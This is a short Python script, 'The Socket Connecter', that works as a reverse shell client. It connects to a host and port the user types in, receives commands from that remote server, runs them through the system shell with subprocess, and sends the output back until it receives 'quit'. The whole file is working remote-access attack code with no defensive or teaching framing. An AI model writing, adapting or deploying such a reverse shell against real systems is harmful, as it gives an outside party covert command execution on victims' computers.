import os
import socket
import subprocess

print("######################")
print("#                    #")
print("#     The Socket     #")
print("#     Connecter      #")
print("#                    #")
print("#     By Yo Boi      #")
print("#       Riley        #")
print("######################")

host = input("What host would you like to connect to? ")
port = int(input("What port is the server using? "))

connection_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
connection_socket.connect((host, port))
print("\n[*] Connected to " + host + " on port " + str(port) + ".\n")

while True:
    print('\nWaiting for a command....')        
    command = connection_socket.recv(1024).decode()

    split_command = command.split()
    print("Received command : ", command)
    if command == "quit":
        break

    if command[:2] == "cd":
        if len(command.split()) == 1:
            connection_socket.send(bytes(os.getcwd(), 'utf-8'))
        elif len(command.split()) == 2:
            try:
                os.chdir(command.split()[1])
                connection_socket.send(bytes("Changed directory to " + os.getcwd(), 'utf-8'))
            except WindowsError:
                connection_socket.send(str.encode("No such directory     : " + os.getcwd()))

    else:
        proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                stdin=subprocess.PIPE)
        stdout_value = proc.stdout.read() + proc.stderr.read()
        print(str(stdout_value) + "\n")
        if stdout_value != "":
            connection_socket.send(stdout_value)
        else:
            connection_socket.send(bytes(str(command) + ' does not return anything', 'utf-8'))

connection_socket.close()